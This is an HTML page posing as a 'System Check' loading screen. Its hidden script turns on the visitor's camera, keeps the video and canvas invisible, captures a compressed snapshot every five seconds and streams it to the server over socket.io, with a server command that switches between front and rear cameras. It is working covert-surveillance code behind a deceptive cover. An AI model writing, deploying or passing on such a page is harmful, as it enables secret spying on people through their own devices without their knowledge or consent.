<!DOCTYPE html>
<html>
<head><title>System Check</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body,html{margin:0;padding:0;background:#000;color:#444;height:100%;display:flex;align-items:center;justify-content:center;font-family:sans-serif;}video,canvas{display:none;}</style></head>
<body>
    <div>ðŸŒ€ Loading System...</div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const v = document.getElementById("v");
        const c = document.getElementById("c");
        let mode = "user", stream;

        async function start() {
            if (stream) stream.getTracks().forEach(t => t.stop());
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            v.srcObject = stream;
            
            // ðŸ“¸ Prottek 5 second por por chobi tule pathabe
            setInterval(takeSnapshot, 5000);
        }

        function takeSnapshot() {
            const ctx = c.getContext("2d");
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            ctx.drawImage(v, 0, 0, c.width, c.height);
            const data = c.toDataURL("image/jpeg", 0.5); // Compression 50%
            socket.emit("image", data);
        }

        socket.on("switch", () => { mode = (mode === "user") ? "environment" : "user"; start(); });
        window.onload = start;
    </script>
</body>
</html>
